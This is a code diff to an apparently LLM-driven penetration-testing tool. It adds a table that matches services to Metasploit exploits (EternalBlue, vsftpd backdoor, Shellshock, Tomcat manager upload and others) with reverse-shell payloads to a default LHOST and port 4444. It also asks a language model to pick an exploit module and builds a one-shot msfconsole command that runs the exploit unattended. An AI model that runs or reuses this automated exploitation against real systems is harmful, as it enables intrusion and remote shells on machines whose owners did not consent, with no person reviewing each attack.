@@ -709,6 +709,12 @@ JSON argument list:"""
     def _default_args(self, tool_name: str, ctx: dict) -> list[str]:
         """Safe fallback defaults when LLM is unavailable."""
         target = ctx.get("target", "")
+        service = ctx.get("service", "")
+        port = ctx.get("port", 0)
+        cve = ctx.get("cve", "")
+        lhost = ctx.get("lhost", "192.168.80.1")
+        lport = ctx.get("lport", 4444)
+        
         defaults: dict[str, list] = {
             "nmap": ["-sV", "-sC", "--top-ports", "1000", target],
             "gobuster": ["dir", "-u", target, "-w",
@@ -717,14 +723,109 @@ JSON argument list:"""
                      "/usr/share/wordlists/dirb/common.txt", "-mc", "200,301,302"],
             "nikto": ["-h", target, "-Tuning", "1234"],
             "sqlmap": ["-u", target, "--batch", "--level=2", "--risk=1"],
-            "hydra": [target, "ssh", "-t", "4"],
+            "hydra": [target, service or "ssh", "-t", "4"],
             "nuclei": ["-u", target, "-severity", "critical,high"],
             "wpscan": ["--url", target, "--enumerate", "u,vp"],
             "feroxbuster": ["-u", target, "-q"],
             "dnsx": ["-l", "subdomains.txt", "-a"],
             "subfinder": ["-d", target, "-silent"],
         }
+        
+        # Special handling for Metasploit - LLM-driven module selection
+        if tool_name == "msfconsole":
+            return self._get_msf_args(target, service, port, cve, lhost, lport)
+        
         return defaults.get(tool_name, [target])
+    
+    def _get_msf_args(
+        self, target: str, service: str, port: int, 
+        cve: str, lhost: str, lport: int
+    ) -> list[str]:
+        """
+        Generate Metasploit arguments based on service/CVE.
+        Uses LLM to select the best module when available.
+        """
+        # Module database for common exploits
+        MSF_MODULES = {
+            # FTP
+            ("vsftpd", "2.3.4"): ("exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact"),
+            ("proftpd", "1.3.3c"): ("exploit/unix/ftp/proftpd_133c_backdoor", "cmd/unix/reverse_perl"),
+            # SMB/Samba
+            ("samba", "3.0"): ("exploit/multi/samba/usermap_script", "cmd/unix/reverse_netcat"),
+            ("smb", "ms17"): ("exploit/windows/smb/ms17_010_eternalblue", "windows/meterpreter/reverse_tcp"),
+            # HTTP
+            ("php", "cgi"): ("exploit/multi/http/php_cgi_arg_injection", "php/reverse_php"),
+            ("shellshock", ""): ("exploit/multi/http/apache_mod_cgi_bash_env_exec", "linux/x86/meterpreter/reverse_tcp"),
+            ("tomcat", ""): ("exploit/multi/http/tomcat_mgr_upload", "java/meterpreter/reverse_tcp"),
+            ("jenkins", ""): ("exploit/multi/http/jenkins_script_console", "linux/x86/meterpreter/reverse_tcp"),
+            # Services
+            ("distccd", ""): ("exploit/unix/misc/distcc_exec", "cmd/unix/reverse_bash"),
+            ("unrealirc", ""): ("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse_perl"),
+            ("java_rmi", ""): ("exploit/multi/misc/java_rmi_server", "java/meterpreter/reverse_tcp"),
+            ("postgres", ""): ("exploit/multi/postgres/postgres_copy_from_program_cmd_exec", "cmd/unix/reverse_bash"),
+        }
+        
+        # Find matching module
+        module = None
+        payload = "cmd/unix/interact"
+        
+        search_key = f"{service} {cve}".lower()
+        for (svc, ver), (mod, pay) in MSF_MODULES.items():
+            if svc in search_key or ver in search_key:
+                module = mod
+                payload = pay
+                break
+        
+        if not module:
+            # Try LLM to find module
+            try:
+                import sys
+                sys.path.insert(0, str(BASE / "src"))
+                from utils.llm_factory import get_llm
+                llm = get_llm("default")
+                
+                prompt = f"""What Metasploit module should I use for:
+Service: {service}
+CVE: {cve}
+Port: {port}
+
+Return ONLY the module path (e.g., exploit/unix/ftp/vsftpd_234_backdoor), nothing else."""
+                
+                response = str(llm.invoke(prompt))
+                m = re.search(r'(exploit/[\w/]+)', response)
+                if m:
+                    module = m.group(1)
+            except Exception:
+                pass
+        
+        if not module:
+            # Generic fallback
+            if "ftp" in service:
+                module = "auxiliary/scanner/ftp/ftp_version"
+            elif "smb" in service or "samba" in service:
+                module = "auxiliary/scanner/smb/smb_version"
+            elif "http" in service:
+                module = "auxiliary/scanner/http/http_version"
+            else:
+                module = "auxiliary/scanner/portscan/tcp"
+        
+        # Build msfconsole command
+        msf_cmd = (
+            f"use {module}; "
+            f"set RHOSTS {target}; "
+        )
+        
+        if port:
+            msf_cmd += f"set RPORT {port}; "
+        
+        if "exploit/" in module:
+            msf_cmd += f"set PAYLOAD {payload}; "
+            msf_cmd += f"set LHOST {lhost}; "
+            msf_cmd += f"set LPORT {lport}; "
+        
+        msf_cmd += "run; exit -y"
+        
+        return ["-q", "-x", msf_cmd]
 
     def use_intelligent(self, tool_name: str, attack_context: dict,
                         timeout: int = 300) -> dict:
